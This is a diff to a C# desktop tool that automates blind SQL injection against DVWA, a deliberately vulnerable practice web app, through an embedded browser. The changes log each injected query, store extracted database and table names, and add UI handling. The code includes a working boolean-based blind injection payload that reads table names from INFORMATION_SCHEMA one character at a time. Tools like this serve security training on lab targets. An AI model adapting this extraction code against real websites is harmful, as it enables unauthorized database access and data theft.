@@ -19,20 +19,36 @@ namespace Tool_SqlInjectionBlind_Dvwa
         public frm_Main()
         {
             InitializeComponent();
+            this.vp = new Tool_SqlInjectionBlind_Dvwa.ViewProcess();
+            vp.Show();
 
             wbro_Brower.Navigate("http://localhost/dvwa/login.php");
 
             wbro_Brower.ScriptErrorsSuppressed = true;
         }
 
-        
         HtmlDocument html_Document_Current;
-        bool wBrower_Done = true;
 
         private string html;
 
 
-        private string sql; 
+        private string sql;
+
+        #region Creating drag form by pnl_ControlBar
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
+        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
+        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
+        public static extern bool ReleaseCapture();
+
+        private void pnl_Header_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
+            {
+                ReleaseCapture();
+                SendMessage(Handle, 0xA1, 0x2, 0);
+            }
+        }
+        #endregion
 
         [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);
@@ -51,6 +67,7 @@ namespace Tool_SqlInjectionBlind_Dvwa
 
         private void PutData(string sql)
         {
+            vp.rtxt_View.Text += sql + Environment.NewLine;
             wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("id")[0].SetAttribute("value", sql); //coplete data to textbox
             wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click"); // call event click button submit
         }
@@ -75,7 +92,6 @@ namespace Tool_SqlInjectionBlind_Dvwa
             html = wbro_Brower.DocumentText;
 
             html_Document_Current = wbro_Brower.Document;
-            wBrower_Done = true;
 
             if (btn_Click)
             {
@@ -106,8 +122,6 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 {
                     if(is_Click_btn_DatabaseName)
                     {
-                        lbl_Result_DBName.Text += str_result;
-
                         is_Click_btn_DatabaseName = false;
                     }
                     else if(is_Click_btn_TablesName)
@@ -126,8 +140,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             {
                                 index = 0;
                                 is_Click_btn_TablesName = false;
-
                                 btn_Click = false;
+
+                                cmb_TbsName.Items.Add(Variable.Db_TablesName);
+                                return;
                             }
                         }
                         else
@@ -150,19 +166,13 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     if (is_Click_btn_DatabaseName)
                     {
                         lbl_Result_DBName.Text += str_result;
+                        Variable.Db_Name += str_result;
+
                         sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
                     }
                     else if(is_Click_btn_TablesName)
                     {
-                        if(cmb_TbsName.Items.Count == 0)
-                        {
-                            cmb_TbsName.Items.Add(str_result);
-                        }
-                        else
-                        {
-                            string str_temp = cmb_TbsName.Items[cmb_TbsName.Items.Count - 1].ToString();
-                            cmb_TbsName.Items[cmb_TbsName.Items.Count - 1] = str_temp + str_result;
-                        }
+                        Variable.Db_TablesName[Variable.Index_Tables] += str_result;
                         sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                     }
                     
@@ -212,11 +222,25 @@ namespace Tool_SqlInjectionBlind_Dvwa
 
             if (count_Tables_Done)
             {
+                if(Variable.Db_TablesName.Count == 0)
+                {
+                   for(int run = 0; run < Variable.Quantity_Tables; run++)
+                    {
+                        Variable.Db_TablesName.Add("");
+                    }
+                }
                 sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                 if (Variable.Index_Tables < Variable.Quantity_Tables)
                 {
                     sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                     PutData(sql);
+                }
+                else
+                {
+                    foreach(string str in Variable.Db_TablesName)
+                    {
+                        lbl_TBsName.Text += " '" + str + "'";
+                    }
                 }
             }
             else
@@ -228,7 +252,12 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 PutData(sql);
             }
 
-            btn_GetDBName.Enabled = false;
+            //btn_GetTBsName.Enabled = false;
+
+        }
+
+        private void btn_GetColsName_Click(object sender, EventArgs e)
+        {
 
         }
     }
